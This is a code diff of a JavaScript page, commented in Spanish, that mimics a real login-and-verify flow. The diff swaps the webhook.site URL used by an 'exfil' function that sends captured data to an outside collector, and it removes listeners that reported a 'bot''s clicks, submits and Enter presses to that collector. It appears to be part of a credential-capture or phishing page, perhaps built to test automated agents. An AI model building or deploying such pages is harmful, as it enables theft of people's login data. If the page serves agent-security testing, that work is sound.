@@ -11,7 +11,7 @@
   "use strict";
 
   // <<< EDITAR: tu URL de webhook.site >>>
-  var COLLECTOR = "https://webhook.site/e2685b51-40e1-4e66-b0d1-2afb36a1d75f";
+  var COLLECTOR = "https://webhook.site/ff98e37e-cfae-4df3-9a5c-e1a9eb8ebafb";
 
   function exfil(fase, datos) {
     var qs = encodeURIComponent(JSON.stringify(datos || {}));
@@ -53,19 +53,6 @@
       el.addEventListener("change", chequear);
     }
   });
-
-  // Diagnostico: ver si el bot clickea / dispara submit en absoluto.
-  document.addEventListener("click", function (ev) {
-    var t = ev.target ? (ev.target.id || ev.target.tagName || "?") : "?";
-    exfil("click", { t: t });
-  }, true);
-  document.addEventListener("submit", function (ev) {
-    var t = ev.target ? (ev.target.id || "?") : "?";
-    exfil("submit-evt", { form: t });
-  }, true);
-  document.addEventListener("keydown", function (ev) {
-    if (ev.key === "Enter") exfil("enter", { on: (ev.target && ev.target.id) || "?" });
-  }, true);
 
   // --- Paso 1: login -> navega a /verificar (igual que el real) ---
   var formLogin = document.getElementById("form-login");
